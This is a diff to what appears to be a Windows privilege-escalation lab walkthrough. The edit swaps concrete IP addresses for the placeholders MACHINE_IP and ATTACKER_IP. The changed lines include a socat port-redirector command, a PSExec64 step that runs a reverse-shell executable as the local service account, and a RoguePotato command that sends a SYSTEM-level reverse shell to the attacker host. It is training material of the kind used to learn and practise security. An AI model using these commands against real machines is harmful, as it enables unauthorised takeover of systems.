@@ -757,7 +757,7 @@ I hope that saves some people trouble of reading through the documentation. A qu
 To begin, we need to setup a `socat` redirector on our machine, forwarding port `135` to `9999` on windows. 
 
 ```console
-$ sudo socat tcp-listen:135,reuseaddr,fork tcp:10.10.220.187:9999
+$ sudo socat tcp-listen:135,reuseaddr,fork tcp:MACHINE_IP:9999
 ```
 
 Once this is done, if we simulate a user logging into the machine with elevated privileges, like a service account user, and using `PSExec64.exe` to trigger the `reverse.exe` executable, we'll receive a reverse shell connection on our machine with elevated privileges.
@@ -771,7 +771,7 @@ C:\Users\user> C:\PrivEsc\PSExec64.exe -i -u "nt authority\local service" C:\Pri
 We now have to set up yet another listener, this time listening on port 9999, and then launch the _RoguePotato_ exploit on the target to get a reverse shell with SYSTEM privilages. This can be done by executing the following command on the target machine:
 
 ```console
-C:\Users\user> C:\PrivEsc\RoguePotato.exe -r 10.10.10.10 -e "C:\PrivEsc\reverse.exe" -l 9999
+C:\Users\user> C:\PrivEsc\RoguePotato.exe -r ATTACKER_IP -e "C:\PrivEsc\reverse.exe" -l 9999
 ```
 
 To quote the README of the git repository we referred to before:
